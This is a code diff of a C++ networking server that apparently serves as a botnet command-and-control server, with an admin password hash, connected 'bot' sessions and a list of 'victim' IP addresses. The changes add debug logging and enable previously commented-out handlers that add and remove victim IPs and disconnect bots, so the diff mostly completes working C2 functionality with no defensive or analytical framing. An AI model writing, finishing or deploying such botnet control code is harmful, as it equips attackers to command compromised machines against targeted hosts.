@@ -4,6 +4,12 @@
 #include <sstream>
 #include <vector>
 
+#ifdef NDEBUG
+#define PRINT(a, b)
+#else
+#define PRINT(a, b) std::cout << "[DEBUG]: " << (a) << (b) << std::endl;
+#endif
+
 server::server(io::io_context& io_context, std::uint16_t port)
     : io_context_(io_context), acceptor_(io_context, tcp::endpoint(tcp::v4(), port)) {
 	command_handlers_ = {
@@ -42,7 +48,7 @@ void server::onAccept(err error_code) {
 	auto& client = clients_sessions_container_.find(client_id)->second;
 
 	client->send("#: Connected succesfully\n");
-	std::cout << "New client connected." << std::endl;
+	PRINT("New client connected", "");
 
 	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
 	accept();
@@ -53,8 +59,14 @@ void server::handleResponse(std::string& query, session* client) {
 
 	auto parsed_msg = msg_parser_.parse_msg(query);
 
-	if (parsed_msg["is_valid_msg"][0] == "false") return;
-	if (command_handlers_.find(parsed_msg["command"][0]) == command_handlers_.end()) return;
+	if (parsed_msg["is_valid_msg"][0] == "false") {
+		PRINT("Invalid message", "");
+		return;
+	}
+	if (command_handlers_.find(parsed_msg["command"][0]) == command_handlers_.end()) {
+		PRINT("No handler for ", parsed_msg["command"][0]);
+		return;
+	};
 
 	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
 	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
@@ -73,6 +85,9 @@ void server::initManager(std::string& command, std::vector<std::string>& params,
 	if (!params.size()) return;
 	std::hash<std::string> hasher;
 	admin_hash_ = hasher(params[0]);
+	PRINT("Initialized manager, succesfully", "");
+	std::vector<std::string> output_params = {"1"};
+	client->send(msg_parser_.genCommand(command, output_params));
 }
 
 bool server::checkHash(std::string& pass) {
@@ -114,43 +129,42 @@ void server::getVictims(std::string& command, std::vector<std::string>& params, 
 void server::addVictim(std::string& command, std::vector<std::string>& params, session* client) {
 	if (params.size() < 2) return;
 	if (!checkHash(params[0])) return;
-
-	// std::unique_lock<std::mutex> lock(victims_m_);
-	// victims_ips_.push_back(params[1]);
+	std::unique_lock<std::mutex> lock(victims_m_);
+	victims_ips_.push_back(params[1]);
 }
 
 void server::removeClient(std::string& command, std::vector<std::string>& params, session* client) {
 	if (params.size() < 2) return;
 	if (!checkHash(params[0])) return;
-	// std::shared_ptr<session> bot;
-	// long int bot_id;
-	// {
-	// 	std::unique_lock<std::mutex> lock(clients_m_);	// TODO: create second hash map with ip addresses
-	// 	for (auto const& [key, val] : clients_sessions_container_) {
-	// 		std::stringstream ip;
-	// 		ip << val->endpoint_;
-	// 		if (params[1] == ip.str()) {
-	// 			bot_id = key;
-	// 			bot = val;
-	// 			break;
-	// 		}
-	// 	}
-	// }
-	// bot->stop();
-	// {
-	// 	std::unique_lock<std::mutex> lock(clients_m_);
-	// 	clients_sessions_container_.erase(bot_id);
-	// }
+	std::shared_ptr<session> bot;
+	long int bot_id;
+	{
+		std::unique_lock<std::mutex> lock(clients_m_);	// TODO: create second hash map with ip addresses
+		for (auto const& [key, val] : clients_sessions_container_) {
+			std::stringstream ip;
+			ip << val->endpoint_;
+			if (params[1] == ip.str()) {
+				bot_id = key;
+				bot = val;
+				break;
+			}
+		}
+	}
+	bot->stop();
+	{
+		std::unique_lock<std::mutex> lock(clients_m_);
+		clients_sessions_container_.erase(bot_id);
+	}
 }
 
 void server::removeVictim(std::string& command, std::vector<std::string>& params, session* client) {
 	if (params.size() < 2) return;
 	if (!checkHash(params[0])) return;
 
-	// std::unique_lock<std::mutex> lock(victims_m_);
-	// auto index = find(victims_ips_.begin(), victims_ips_.end(), params[1]);
-	// if (index == victims_ips_.end()) return;
-	// victims_ips_.erase(std::remove(victims_ips_.begin(), victims_ips_.end(), params[1]), victims_ips_.end());
+	std::unique_lock<std::mutex> lock(victims_m_);
+	auto index = find(victims_ips_.begin(), victims_ips_.end(), params[1]);
+	if (index == victims_ips_.end()) return;
+	victims_ips_.erase(std::remove(victims_ips_.begin(), victims_ips_.end(), params[1]), victims_ips_.end());
 }
 
 void server::pingClients() {
